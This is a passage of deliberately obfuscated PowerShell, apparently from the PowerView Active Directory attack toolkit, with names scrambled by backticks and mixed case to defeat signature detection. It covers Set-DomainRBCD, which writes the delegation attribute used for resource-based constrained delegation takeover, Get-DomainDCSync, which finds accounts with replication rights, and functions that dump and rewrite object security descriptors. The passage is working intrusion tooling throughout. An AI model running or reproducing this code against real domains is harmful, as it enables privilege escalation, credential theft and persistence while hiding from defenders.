        ${S`EarChEr`A`Rg`Um`eNTs} = @{}
        if (${psBOUNdPa`RA`mEte`RS}['Domain']) { ${sEAr`cHEr`ArGU`MeNtS}['Domain'] = ${D`om`AiN} }
        if (${p`s`BoU`NDPara`M`eTers}['Properties']) { ${SE`ARch`eRarG`UME`NTS}['Properties'] = ${pROPErt`I`eS} }
        if (${PsBOund`P`A`R`Ame`TeRS}['SearchBase']) { ${s`earChe`RARGuMeN`TS}['SearchBase'] = ${S`Ea`Rchba`sE} }
        if (${P`sbo`UNdPa`R`AMe`TeRs}['Server']) { ${sEaRc`H`eRa`RGUM`EN`Ts}['Server'] = ${s`eRV`er} }
        if (${psBOUnDpA`R`AM`e`TeRs}['SearchScope']) { ${Se`A`RcHeRa`RGU`meNtS}['SearchScope'] = ${seAR`CHSCO`PE} }
        if (${ps`BOunDP`ARaMET`eRS}['ResultPageSize']) { ${s`eA`Rch`eRA`RgU`menTS}['ResultPageSize'] = ${r`e`sULT`PAgeSize} }
        if (${pSBou`Nd`p`ARa`MEteRS}['ServerTimeLimit']) { ${SEaRCh`Er`Ar`GU`mEntS}['ServerTimeLimit'] = ${serve`R`TiM`eli`mIt} }
        if (${PsBounD`p`ARame`TerS}['SecurityMasks']) { ${SeArCh`er`AR`G`Umen`TS}['SecurityMasks'] = ${s`E`Curit`ymAsKs} }
        if (${PSbOUn`DP`A`R`Ame`TErs}['Tombstone']) { ${S`eArchEra`RgUme`N`Ts}['Tombstone'] = ${ToMB`sT`onE} }
        if (${PsBoUNdP`A`R`Am`eters}['Credential']) { ${SE`ARcheR`A`RGUmen`TS}['Credential'] = ${cred`En`T`IAL} }
        ${rB`cDSEarc`hEr} = GET`-`doMA`inse`ARChEr @SearcherArguments
    }

    PROCESS {
        
        if (${pSbOUnD`pA`RameTe`Rs} -and (${pSbOu`Nd`paRaMe`TErS}.Count -ne 0)) {
            n`ew-DY`NaM`iCpArA`mE`T`Er -CreateVariables -BoundParameters ${pSBO`UNDpAr`A`m`eterS}
        }
        if (${Rb`c`DseArcH`er}) {
            ${ident`iTy`F`Il`TER} = ''
            ${f`ilter} = ''

            
            ${SDd`ls`TrinG} = ''
            if (${p`SB`ouN`dp`ARAMeTErS}['DelegateFrom']) {
                ${dE`lEG`A`TefilTEr} = ''
                ${De`L`eGA`TE`FROm}.Split('|') | Get-`IDEN`T`iTYFiL`TErst`R`Ing | fOre`Ac`H-`OBj`eCT {
                    ${D`E`LeGA`TEFiL`TeR} += ${_}
                    Wri`T`e-V`Erb`oSE "[Set-DomainRBCD] Appending DelegateFilter: $_"
                }

                ${R`BC`D`SeaRcHEr}.filter = "(|$DelegateFilter)"
                Wr`i`TE`-veRbOSe "[Set-DomainRBCD] Set-DomainRBCD filter string: $($RBCDSearcher.filter)"
                ${res`UL`TS} = ${R`BcD`SE`ARC`Her}.FindAll()
                if (${rE`suLts}) {
                    ${s`ddLstR`inG} = 'O:BAD:'
                }
                ${r`eSULtS} | wh`Er`E-O`BJeCt {${_}} | fo`R`eAcH`-Ob`jeCT {
                    ${o`B`Ject} = COnv`eRT-`l`DAp`pROP`ERTY -Properties ${_}.Properties
                    ${ob`JEct}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                    ${sDd`l`sTR`ing} += "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($Object.objectsid))"
                    WRi`TE`-V`er`BOse "[Set-DomainRBCD] Appending to SDDL string: (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($Object.objectsid))"
                }
                if (${res`UL`TS}) {
                    try { ${r`E`sUltS}.dispose() }
                    catch {
                        wR`ite-VeRBo`se "[Set-DomainRBCD] Error disposing of the Results object: $_"
                    }
                }
                WR`It`e-VeRbO`se "[Set-DomainRBCD] Using SDDL string: $SDDLString"
                ${sD} = nE`W-obJ`ECT SeCUrity.a`CcEsSconTrol.`R`AwseCUrI`T`YDEs`CrI`PTOr -ArgumentList ${sddl`st`R`iNG}
                ${SdB`YTEs} = NeW-`obj`Ect b`YTE[] (${S`d}.BinaryLength)
                ${S`D}.GetBinaryForm(${S`D`BYTes}, 0)

            }
            
            ${idEn`TI`T`Y`paRTS} = ${idEnt`Ity} -split '\\'
            if (${i`D`eNtITypA`RtS}.length -gt 1) {
                ${Se`A`RcHERaRg`UM`EntS}['Domain'] = ${Id`Entit`y`pAR`Ts}[0]
                ${i`dE`NTiTY} = ${ide`N`T`ItYp`Arts}[1]
            }
            ${id`EN`TiTYSEA`RCHEr} = GE`T`-`doM`AiNSearchER @SearcherArguments
            ${IDE`NtI`Ty} | GET-`Id`e`NT`ItyFIL`TeRsTrInG | FOrEa`Ch-ObJe`Ct {
                ${i`DENtIt`yF`ilTER} += ${_}
            }
            if (${IDe`NTITY`F`iLTER} -and (${IdeNtITY`Fi`L`TEr}.Trim() -ne '') ) {
                ${fI`Lt`er} = "(|$IdentityFilter)"
            }

            if (${psBOU`NDP`ARa`me`Te`Rs}['LDAPFilter']) {
                WRi`TE-ve`RBosE "[Set-DomainRBCD] Using additional LDAP filter: $LDAPFilter"
                ${f`I`LteR} += "$LDAPFilter"
            }
            if (${FiLt`ER} -and ${F`il`TER} -ne '') {
                ${iDe`NTItysE`Ar`chER}.filter = "(&$Filter)"
            }
            wrI`Te-`VErb`o`sE "[Set-DomainRBCD] Set-DomainRBCD filter string: $($RBCDSearcher.filter)"

            if (${p`sbounDPAram`eT`eRs}['FindOne']) { ${REs`U`lTs} = ${Rb`cdSeARCh`eR}.FindOne() }
            else { ${RE`SU`lTs} = ${Identi`Ty`searc`HER}.FindAll() }
            ${R`ESUL`TS} | w`He`Re-OB`JEcT {${_}} | fO`REach`-ob`jECT {
                ${Ob`jEct} = ${_}
                ${oBJ`ecT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                ${Ent`RY} = ${OBj`Ect}.GetDirectoryEntry()
                try {
                    w`RitE`-`VeRbosE "[Set-DomainRBCD] Setting 'msds-allowedtoactonbehalfofotheridentity' to '$SDBytes' for object '$($Object.Properties.samaccountname)'"
                    if (${S`db`ytEs}) {
                        ${eN`TrY}.put('msds-allowedtoactonbehalfofotheridentity', ${SdB`yT`es})
                    }
                    elseif (${p`SBou`ND`PAra`Me`TeRS}['Clear']) {
                        ${En`TRy}.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
                    }
                    ${en`T`RY}.commitchanges()
                }
                catch {
                    wRItE-wa`R`NiNG "[Set-DomainRBCD] Error setting/replacing properties for object '$($Object.Properties.samaccountname)' : $SDBytes"
                }

            }
            if (${R`ES`UlTs}) {
                try { ${Re`sUl`TS}.dispose() }
                catch {
                    wrITe-`Ve`R`BO`SE "[Set-DomainRBCD] Error disposing of the Results object: $_"
                }
            }
            ${RbCd`sEarCh`Er}.dispose()
        }
    }
}

function get-iDEn`T`I`Ty`FI`lt`eR`StRing {

    [OutputType([String])]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`RUE})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${iDeNT`i`TY}
    )

    BEGIN {
        ${sea`Rc`he`RaRGUm`enTS} = @{}
    }

    PROCESS {
        ${I`D`ENTitYf`IlTEr} = ''
        ${fI`Lter} = ''
        ${I`dE`NtiTY} | w`hEre-OB`jE`CT {${_}} | foREA`C`h-Obj`ect {
            ${idENTI`TY`InS`TANCe} = ${_}.Replace('(', '\28').Replace(')', '\29')
            if (${ID`EnTiTyi`N`staNce} -match '^S-1-') {
                ${Id`ENTIt`Yf`I`LTer} += "(objectsid=$IdentityInstance)"
            }
            elseif (${IdENTiT`yi`NsTAn`CE} -match '^(CN|OU|DC)=') {
                ${id`e`NtIt`yFi`ltER} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${P`s`BoUND`paramETeRs}['Domain']) -and (-not ${pSb`OUndpar`AmeT`e`RS}['SearchBase'])) {
                    
                    
                    ${Id`eNTI`TYdoma`In} = ${i`DEnti`Ty`iN`StanCe}.SubString(${ideNtItyI`Ns`T`AN`CE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    WRit`E`-VerBOSe "[Get-IdentityFilterString] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                    
                    
                        
                    
                }
            }
            elseif (${Id`enTi`Tyinst`ANCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${gU`I`Dby`TESTr`iNG} = (([Guid]${i`d`ENTI`T`yI`NStAnce}).ToByteArray() | F`orE`A`cH-OB`JECt { '\' + ${_}.ToString('X2') }) -join ''
                ${i`den`TiT`YFIltER} += "(objectguid=$GuidByteString)"
            }
            elseif (${i`De`NTI`TYIN`S`TaNcE}.Contains('\')) {
                ${coN`V`eRT`eDi`d`e`NtityiN`staNCE} = ${idENTI`T`y`iNs`Tance}.Replace('\28', '(').Replace('\29', ')') | cONV`E`RT-`Adna`mE -OutputType CaN`onI`cAl
                if (${convERT`Edi`deNtityin`S`TA`N`Ce}) {
                    ${objE`CtD`om`Ain} = ${c`o`NvERTEDiDEntI`TYINSTa`N`ce}.SubString(0, ${CONvERTeD`id`eN`TI`TyIn`stanCE}.IndexOf('/'))
                    ${ob`Je`cTnaMe} = ${IDent`iT`y`iNs`TANCe}.Split('\')[1]
                    ${IDenT`ITyfI`Lter} += "(samAccountName=$ObjectName)"
                    
                    wRIT`E`-v`eRbOSe "[Get-IdentityFilterString] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                }
            }
            elseif (${I`D`eNtITy`iNstanCE}.Contains('.')) {
                ${I`DenTiTY`FIlt`ER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
            }
            else {
                ${IdeN`T`iTyFI`lter} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
            }
        }
        if (${IdEn`Ti`T`y`FiLTER} -and (${I`d`enT`It`YfiLTER}.Trim() -ne '') ) {
            ${fi`LT`er} += "(|$IdentityFilter)"
        }
        ${Fil`TER}
    }
}



function gEt`-D`oMainDC`sy`NC {

    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param (
        [Switch]
        ${usE`Rs},

        [Switch]
        ${cO`m`PUtERs},

        [Switch]
        ${GroU`ps},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOm`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`dAPf`ILT`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prO`PE`RTi`Es},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`eA`RchBA`se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SErV`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`eA`RChsCo`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`UL`TPA`geS`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`Ve`RTimeLiMIT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${seC`UR`itYMAS`ks},

        [Switch]
        ${T`OmBS`TOne},

        [Alias('ReturnOne')]
        [Switch]
        ${f`I`NdoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdent`I`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}

    )

    BEGIN {
        ${seAR`CherARgUmE`N`Ts} = @{}
        ${Dn`seArC`HERARGUMeN`Ts} = @{}
        if (${psBoU`N`dPArA`meTErS}['Domain']) { ${S`e`ARcH`eRArgumENts}['Domain'] = ${dOm`AiN}; ${Dnsea`RCh`EraRGUmeN`TS}['Domain'] = ${d`Om`Ain} }
        if (${Psb`O`UNdpA`RAmeTErs}['Properties']) { ${S`Ea`RCHe`R`ARGUMe`Nts}['Properties'] = ${pro`Pe`RtIES} }
        if (${pSBoundpa`R`A`ME`Te`RS}['SearchBase']) { ${seA`R`c`HeRARGUMENTs}['SearchBase'] = ${sEaR`c`HBaSe} }
        if (${p`sbOu`NdPArAMe`T`E`Rs}['Server']) { ${S`EArc`hERA`RGUMEn`Ts}['Server'] = ${s`eR`VeR}; ${dnSE`AR`c`HeRarGUmEn`Ts}['Server'] = ${SER`VEr} }
        if (${P`sBo`U`NDp`ArAmEtErs}['SearchScope']) { ${Sea`R`ChErAr`guMENTs}['SearchScope'] = ${SeArc`H`ScOpE} }
        if (${psB`oUNdPar`A`Met`e`Rs}['ResultPageSize']) { ${SE`ARchER`ArgUm`E`N`Ts}['ResultPageSize'] = ${r`ESu`LTpAg`ESiZE} }
        if (${PSbO`U`NdpA`RAME`Te`RS}['ServerTimeLimit']) { ${seArC`hE`RaR`gUM`enTS}['ServerTimeLimit'] = ${s`erVe`RtimEl`ImIT} }
        if (${p`s`Bou`NDP`ARamEteRs}['SecurityMasks']) { ${SEaRchEr`AR`Gu`MeNtS}['SecurityMasks'] = ${SECu`Ri`TYma`s`kS} }
        if (${p`Sb`o`Und`p`ARameterS}['Tombstone']) { ${sEarc`hEr`Ar`gume`NTS}['Tombstone'] = ${tOmbS`T`ONE} }
        if (${pS`B`OuND`PARaMeTE`RS}['Credential']) { ${SEaR`chEra`RG`U`MeNtS}['Credential'] = ${creD`enti`Al} }
        ${ob`j`eCTSEA`R`cHER} = ge`T-`dOM`Ai`NSEarc`Her @SearcherArguments
    }

    PROCESS {
        ${dOM`A`INdN} = gET-dOM`AI`N`dN @DNSearcherArguments
        WRit`E-`V`ER`BosE "[Get-DomainDCSync] Retrieved the domain distinguishedname: $DomainDN"

        
        ${pr`iVs} = @{}

        
        ${nOT`YPe} = ${tR`UE}
        if (${pSbOU`N`D`parA`MEteRS}['Users'] -or ${p`SB`O`U`NDPARAMetErs}['Computers'] -or ${PsB`O`UN`DP`AraMETers}['Groups']) {
            ${N`oTYPe} = ${FAl`sE}
        }

        
        gET-doMAi`N`objecta`Cl ${d`OMa`iNDn} -RightsFilter D`cs`YNc @SearcherArguments | FO`ReAcH`-o`BjECT {
            ${A`ce} = ${_}
            ${S`ID} = ${A`CE}.SecurityIdentifier.Value
            ${a`dRi`GHts} = ${A`cE}.ActiveDirectoryRights
            if (${AD`RIg`H`Ts} -eq 'GenericAll' -or (${aDr`iGhtS} -eq 'ExtendedRight' -and !(${a`Ce}.ObjectAceType) -and !(${A`CE}.InheritedObjectAceType))) {
                ${Pr`I`VS}.${S`Id} = @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
            }
            else {
                ${A`cet`ype} = ${A`cE}.ObjectAceType.Guid
                if (!(${P`R`IVs}.keys -contains ${S`iD})) {
                    ${pri`VS}.Add(${s`ID}, @(${AC`eTyPE}))
                }
                elseif (!(${p`RI`Vs}.${S`ID} -contains ${a`CeT`YPE})) {
                    ${pR`i`Vs}.${S`iD} += ${A`CEty`pE}
                }
            }
        }

        
        ${F`il`Ter} = ''
        ${T`yp`eFiltER} = ''
        ${I`D`EnTitYFiL`TER} = ''
        if (${p`Sbo`UNDpA`Ra`mET`ErS}['Users']) {
            ${Typ`E`FilTEr} += '(samAccountType=805306368)'
        }
        if (${pS`B`Oun`dPAr`AMeTers}['Computers']) {
            ${t`YpE`FiL`Ter} += '(samAccountType=805306369)'
        }
        if (${P`S`BoundPa`Ra`METeRS}['Groups']) {
            ${tY`pE`F`IlteR} += '(objectCategory=group)'
        }
        if (${t`yPefil`TeR} -and (${tYP`e`FILTeR}.Trim() -ne '')) {
            ${f`I`LteR} = "(|$TypeFilter)"
        }
        else {
            ${Fi`l`TeR} = '(|(samAccountType=805306368)(samAccountType=805306369))'
        }

        
        ${c`Heck} = @()

        ${PrI`Vs}.keys | Fo`R`e`AC`h-objecT {
            if (${p`R`IvS}.${_}.Contains('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2') -and ${p`RivS}.${_}.Contains('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')) {
                ${o`B`JECT} = GET-dom`AIn`ob`j`ecT ${_}
                if (${obje`cT}) {
                    ${o`BjecTS`ID} = ${Ob`J`eCt}.objectsid
                    if (${o`BjEct}.objectclass -contains 'group') {
                        if (${psBo`Und`pAR`A`M`eTErs}['Groups'] -and !(${chE`cK} -contains ${OB`jEcT`siD})) {
                            ${iDEn`TiTy`F`Il`TeR} += "(objectsid=$ObjectSID)"
                        }
                        ${Obj`ECt} | GE`T-Doma`INg`Roup`MeMBER -Recurse @SearcherArguments | F`orEacH`-ObjeCT {
                            ${Me`MBE`Rsid} = ${_}.MemberSID
                            if (${_}.MemberObjectClass -ne 'group' -and !(${cH`e`CK} -contains ${mEm`B`erSId})) {
                                if ((${No`T`ype}) -Or (((${PS`B`O`UnDpARA`mETe`RS}['Users']) -And (${_}.MemberObjectClass -eq 'user')) -Or ((${PSb`ou`NDPARameTE`Rs}['Computers']) -And (${_}.MemberObjectClass -eq 'computer')))) {
                                    ${IdEnti`TYF`Il`TER} += "(objectsid=$MemberSID)"
                                }
                            }
                            elseif (!(${ch`e`Ck} -contains ${mE`mBE`RsId})) {
                                if (${PS`BoUndP`ARAM`EtE`Rs}['Groups']) {
                                    ${I`De`NTiTYf`ILTer} += "(objectsid=$MemberSID)"
                                }
                            }
                            ${c`h`Eck} += ${M`e`Mber`Sid}
                        }
                    }
                    elseif (!(${cH`ECk} -contains ${O`BjecTs`Id})) {
                        if ((${nO`T`yPE}) -Or (((${PSBOU`Nd`pArAMe`Te`RS}['Users']) -And (${oB`j`ecT}.samaccounttype -eq 'USER_OBJECT')) -Or ((${ps`BounD`PaR`AM`E`TERs}['Computers']) -And (${oB`Ject}.samaccounttype -eq 'MACHINE_ACCOUNT')))) {
                            ${i`d`ENtityfILT`Er} += "(objectsid=$ObjectSID)"
                        }
                    }
                    ${ch`Eck} += ${obj`Ec`TSid}
                }
            }
        }

        if (${IdE`NTItyF`iLT`eR} -and (${Id`enT`iTyfi`lT`er}.Trim() -ne '') ) {
            ${f`iL`TEr} += "(|$IdentityFilter)"
        }

        if (${PsBo`U`Nd`Pa`RAm`ETErs}['LDAPFilter']) {
            WR`It`e`-VerbO`se "[Get-DomainDCSync] Using additional LDAP filter: $LDAPFilter"
            ${fIL`T`eR} += "$LDAPFilter"
        }

        if (${F`Il`Ter} -and ${f`iL`TEr} -ne '') {
            ${ObJEcTSEArC`H`er}.filter = "(&$Filter)"
        }
        wrITe-`VER`B`ose "[Get-DomainDCSync] Get-DomainDCSync filter string: $($ObjectSearcher.filter)"

        if (${ps`BO`Un`dpaRaMEtERs}['FindOne']) { ${res`U`Lts} = ${o`Bje`ctsEaRCHeR}.FindOne() }
        else { ${re`Su`lTs} = ${oBJ`ect`S`eARchEr}.FindAll() }
        ${R`es`ULTS} | W`heR`E-OBj`eCt {${_}} | f`OReAcH-`oBJE`cT {
            if (${pSboun`dp`ArAme`T`E`Rs}['Raw']) {
                
                ${OBjE`Ct} = ${_}
                ${OBjE`cT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
            }
            else {
                ${obJ`e`CT} = CoNvE`Rt`-LDaPp`RoPE`RtY -Properties ${_}.Properties
                ${ob`jE`cT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
            }

            ${OBJ`E`Ct}
        }
        if (${r`esul`Ts}) {
            try { ${r`Es`ULts}.dispose() }
            catch {
                w`R`ItE-Ver`BOsE "[Get-DomainDCSync] Error disposing of the Results object: $_"
            }
        }
        ${o`Bj`eCTseArCheR}.dispose()

    }
}

function g`ET`-`DoMaINo`BJe`CTSd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([PSObject])]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${iDent`I`Ty},

        [String]
        ${ouT`FI`le},

        [String]
        ${c`HeCK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`EA`RcHB`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`e`RVeR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`Ar`CHsco`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`sULTp`A`gesIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVE`Rt`i`meLIM`it},

        [Switch]
        ${T`Omb`St`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`deNTial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SEA`RC`He`R`A`RGUMENtS} = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        ${SE`ARch`ErarGu`mEntS}['SecurityMasks'] = 'Dacl'
        if (${P`s`BOun`dP`AraM`eTeRS}['Domain']) { ${Sea`RcHERar`Gum`En`Ts}['Domain'] = ${dOm`Ain} }
        if (${PSbOUNdp`Ar`A`m`eters}['SearchBase']) { ${S`EARchE`RArGu`men`TS}['SearchBase'] = ${SEARcH`BA`Se} }
        if (${pS`BO`UN`D`pARAMETERs}['Server']) { ${S`eARcHErA`RGU`M`Ents}['Server'] = ${Se`RVER} }
        if (${PsboUN`dP`ArAMEte`RS}['SearchScope']) { ${SE`ArCh`ERARG`U`MeNtS}['SearchScope'] = ${s`EA`R`cHScopE} }
        if (${PSBO`UndPA`Ram`EteRS}['ResultPageSize']) { ${Se`ARc`HeRa`RgUments}['ResultPageSize'] = ${resUlt`p`AGEs`izE} }
        if (${p`sbouNdp`ArA`mE`Ters}['ServerTimeLimit']) { ${s`EarCH`ErA`R`g`UmENTs}['ServerTimeLimit'] = ${se`R`VeR`T`imELIMiT} }
        if (${P`sBOUNdpArAM`e`TERs}['Tombstone']) { ${s`e`A`R`cherarGUMents}['Tombstone'] = ${T`oMbSTo`NE} }
        if (${psBounDpar`A`Me`TeRS}['Credential']) { ${s`Ear`cHERARgUm`E`N`TS}['Credential'] = ${C`Rede`NtIAl} }
        ${SE`Arc`H`er} = geT-`dOMaI`NsEARc`H`eR @SearcherArguments
    }

    PROCESS {
        if (${S`EARC`hER}) {
            ${FIL`TER} = ''
            ${C`HECKS} = ''
            ${i`DEn`T`iTy} | g`eT-IdenTItY`F`il`TersT`R`InG | fORea`ch-`oB`jeCt {
                ${f`iL`Ter} += ${_}
            }
            if (!(${Fi`LtER}) -and ${psB`OUnDPa`R`Am`eTE`RS}['Check'] -and (TeS`T-`p`AtH -Path ${c`Heck} -PathType L`EAF)) {
                ${CH`eCKs} = im`PO`Rt-CsV ${C`He`CK}
                ${cH`ecKS} | f`or`e`Ac`h-OBJECt {${fIl`T`Er} += gET`-IdeN`TITy`F`ILTeR`StriNg ${_}.ObjectSID}
            }
            if (${FiL`T`eR}) {
                ${se`AR`CHer}.filter = "(|$Filter)"
                writE`-`VEr`BoSe "[Get-DomainObjectSD] Using filter: $($Searcher.filter)"
                ${oB`jEcTs} = @()
                ${R`ESU`lTs} = ${S`Ear`C`her}.FindAll()
                ${RES`Ul`Ts} | whER`E-O`BjeCT {${_}} | fo`ReAch-`OB`je`Ct {
                    ${o`BjECT} = ${_}.Properties

                    if (${ObJ`E`ct}.objectsid -and ${obJ`e`cT}.objectsid[0]) {
                        ${obje`c`TSid} = (NeW-`O`B`Ject sYs`Te`m.SeCU`RiTY`.pRI`NC`IP`A`L.secUR`ITy`iDEnTI`F`i`er(${ObJE`CT}.objectsid[0],0)).Value
                    }
                    else {
                        ${O`BJEc`T`sId} = ${n`Ull}
                    }

                    ${se`CURIt`ydesCR`IptoR} = NEw-`OBJe`cT SECuri`Ty.ACcESSCoN`Trol.`RawSeCUrityd`eScr`i`p`Tor -ArgumentList ${Ob`je`CT}['ntsecuritydescriptor'][0], 0
                    ${sDd`lOB`JECT} = nEW`-ObJ`EcT ps`o`BJect
                    ${sdDLo`BJ`E`ct} | adD-m`EM`BER "ObjectSID" ${oB`jEcTs`Id}
                    ${sD`D`LobjE`cT} | a`DD-mE`mber "ObjectSDDL" ${SEcUrI`T`yDEsCR`i`PToR}.GetSddlForm(15)
                    if (${c`h`ecKs}) {
                        ${S`dD`LToCHe`cK} = ${C`Hecks} | w`hE`RE-o`BJECt {${_}.ObjectSID -eq ${oBJ`Ec`TSID}}
                        if (${sDDl`T`OcHE`Ck}.ObjectSDDL -eq ${sD`dL`obj`ECt}.ObjectSDDL) {
                            wr`I`Te-verboSE "[Get-DomainObjectSD] SD for $($Object.samaccountname) is the same as the one provided"
                        }
                        else {
                            wRIT`e`-w`ARNing "[Get-DomainObjectSD] SD for $($Object.samaccountname) is different to the one provided"
                            ${SddlOB`j`EcT}
                            ${oB`Je`cTs} += ${SDDLo`BjE`Ct}
                        }
                    }
                    elseif (${ps`Bo`UnDPAr`AM`ETE`Rs}['Check'] -and ${ch`eCK} -eq ${s`d`DLobJ`ECt}.ObjectSDDL) {
                        w`RITe-W`ARN`iNg "[Get-DomainObjectSD] SD for $($Object.samaccountname) is the same as the one provided"
                    }
                    elseif (${Ps`BOuN`dpARAM`eTErS}['Check']) {
                        WrItE`-W`A`Rning "[Get-DomainObjectSD] SD for $($Object.samaccountname) is different to the one provided"
                        ${SD`dloBj`E`cT}
                        ${OB`j`eCTs} += ${sD`D`lObjECt}
                    }
                    else {
                        ${S`DdloB`J`Ect}
                        ${objEC`TS} += ${sdDlOb`J`ECt}
                    }
                }
                if (${Ps`B`ou`NdPaR`AmeTerS}['OutFile']) {
                    try {
                        WritE-v`E`RBose "[Get-DomainObjectSD] Writing object SD information to $OutFile"
                        ${oBj`E`cTs} | forEAcH`-O`BJE`Ct { eXP`OR`T-csv -InputObject ${_} -Path ${OUTf`i`lE} -Append }
                    }
                    catch {
                        w`Ri`Te-WA`RNing "[Get-DomainObjectSD] Unable to write $OutFile"
                    }
                } 
            }
        }
    }
}


function Se`T-dO`MAINOBjEc`TSD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${iDenT`i`Ty},

        [String]
        ${in`PU`TFiLe},

        [String]
        ${S`DDlst`RiNg},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMaiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ld`A`pFILtEr},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEAR`ChB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeR`VeR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`ear`ch`SCope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`s`Ultpa`Gesi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVE`RTiMEl`IMIT},

        [Switch]
        ${T`OmBS`TOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEden`Ti`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SeAR`cHe`R`ARgumeNtS} = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        ${SEArch`Era`RGUME`N`TS}['SecurityMasks'] = 'Dacl'
        if (${ps`B`OUnDpA`RAm`eteRS}['Domain']) { ${SeA`RCh`EraRgU`MENTs}['Domain'] = ${DOM`A`iN} }
        if (${psbO`U`NDpa`RAM`et`eRs}['SearchBase']) { ${s`earCHE`R`ARgum`eN`Ts}['SearchBase'] = ${sE`Ar`cHBASE} }
        if (${PSBO`UNdp`A`R`AmeTE`Rs}['Server']) { ${s`EAr`cHeRarGUme`Nts}['Server'] = ${sE`R`VEr} }
        if (${Ps`B`OU`N`dp`ArAmETeRS}['SearchScope']) { ${sEarc`H`e`RAR`GUmEN`TS}['SearchScope'] = ${se`A`Rchs`COPE} }
        if (${PsBouN`DPaRaM`e`TeRS}['ResultPageSize']) { ${Se`ArCh`e`RAr`GUme`NTs}['ResultPageSize'] = ${ResUL`Tpage`SIze} }
        if (${psBO`U`NDParame`TErs}['ServerTimeLimit']) { ${S`EA`RCh`eRarGUmen`Ts}['ServerTimeLimit'] = ${SER`VErTImE`L`I`Mit} }
        if (${pSB`OuNDPaRAm`E`TeRs}['Tombstone']) { ${SEARC`he`RA`RGUmEN`TS}['Tombstone'] = ${T`OMB`sTonE} }
        if (${pSbO`U`NdparAmET`Ers}['Credential']) { ${sE`A`RCHeR`ARguMeNts}['Credential'] = ${cR`e`denTiAL} }
        ${seArC`h`eR} = gET-`d`OMA`I`NSEarChER @SearcherArguments
    }

    PROCESS {
        if (${s`Ea`RCHer}) {
            ${RE`S`TOr`etargEts} = @{}
            ${fI`L`TER} = ''
            if (${psB`OUNdP`A`RAmE`TERS}['InputFile']) {
                try {
                    wRit`e-vEr`B`oSE "[Set-DomainObjectSD] Reading provided input file: $InputFile"
                    i`MPO`Rt-C`sV ${in`P`Ut`FILe} | fOreACh`-o`BJ`EcT {
